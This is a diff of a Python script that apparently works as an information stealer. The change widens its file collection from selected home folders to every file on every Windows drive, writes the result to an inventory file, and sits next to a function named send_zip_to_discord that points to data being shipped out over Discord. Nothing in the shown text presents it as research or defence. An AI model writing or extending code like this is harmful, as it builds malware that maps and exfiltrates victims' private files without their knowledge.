@@ -857,31 +857,43 @@ def format_file_info(path):
         return f"{path}\n  [Access Denied]\n"
 
 def collect_file_inventory():
-    home = Path.home()
+    import string
+    from pathlib import Path
+    
     output = []
-    for folder in FOLDERS:
-        folder_path = home / folder
-        output.append(f"\n=== {folder} ===\n")
-        if folder_path.exists():
-            try:
-                for item in folder_path.rglob("*"):
+    all_drives = []
+    
+    for letter in string.ascii_uppercase:
+        drive = f"{letter}:\\"
+        if os.path.exists(drive):
+            all_drives.append(drive)
+    
+    for drive in all_drives:
+        output.append(f"\n{'='*60}\nDRIVE: {drive}\n{'='*60}\n")
+        
+        try:
+            for root, dirs, files in os.walk(drive):
+                skip_dirs = ['Windows', 'System32', 'System Volume Information', '$Recycle.Bin', 
+                            'Recovery', 'Program Files', 'Program Files (x86)', 'AppData']
+                dirs[:] = [d for d in dirs if d not in skip_dirs]
+                
+                for file in files:
                     try:
-                        if item.is_file():
-                            output.append(format_file_info(item))
+                        full_path = os.path.join(root, file)
+                        output.append(full_path)
                     except:
                         continue
-            except:
-                output.append("Access denied.\n")
-        else:
-            output.append("Folder not found.\n")
-
+        except Exception as e:
+            output.append(f"[!] Access denied on {drive}: {e}")
+            continue
+    
     if output:
-        inventory_file = os.path.join(BASE_OUTPUT_DIR, "file_inventory.txt")
+        inventory_file = os.path.join(BASE_OUTPUT_DIR, "full_file_inventory.txt")
         with open(inventory_file, 'w', encoding='utf-8') as f:
             f.write("\n".join(output))
         return inventory_file
     return None
-
+    
 def send_zip_to_discord(zip_path):
     if not os.path.exists(zip_path):
         return False
